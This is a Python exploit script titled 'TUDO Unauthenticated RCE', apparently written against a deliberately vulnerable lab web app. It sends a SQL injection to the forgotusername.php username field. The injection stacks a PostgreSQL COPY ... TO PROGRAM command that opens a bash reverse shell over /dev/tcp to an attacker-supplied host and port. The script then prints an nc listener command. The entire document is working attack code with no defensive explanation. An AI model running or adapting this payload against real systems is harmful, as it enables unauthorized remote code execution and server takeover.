#!/usr/bin/env python3

# @title  TUDO Unauthenticated RCE
# @author brave_


import requests
import sys

def send_reverse_shell(target_url, lhost, lport, cookie=None):
    """Send the reverse shell payload"""
    headers = {
        'Host': '172.17.0.2',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://172.17.0.2',
        'Connection': 'keep-alive',
        'Referer': 'http://172.17.0.2/forgotusername.php',
        'Upgrade-Insecure-Requests': '1',
    }
    
    if cookie:
        headers['Cookie'] = cookie
    
    # Exact payload format from your successful request
    payload = f"user1'%3b+COPY+(SELECT+'')+TO+PROGRAM+'bash+-c+\"bash+-i+>%26+/dev/tcp/{lhost}/{lport}+0>%261\"'--"
    
    data = f'username={payload}'
    
    try:
        print("[*] Sending reverse shell payload...")
        response = requests.post(target_url, headers=headers, data=data, timeout=5)
        print("[+] Payload sent successfully!")
        return True
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 exploit.py <target_url> <lhost> <lport> [cookie]")
        print("Example: python3 exploit.py http://172.17.0.2/forgotusername.php 192.168.100.8 8989")
        sys.exit(1)
    
    target_url = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]
    cookie = sys.argv[4] if len(sys.argv) > 4 else None
    
    send_reverse_shell(target_url, lhost, lport, cookie)
    print("[*] Start your listener with: nc -lvnp", lport)
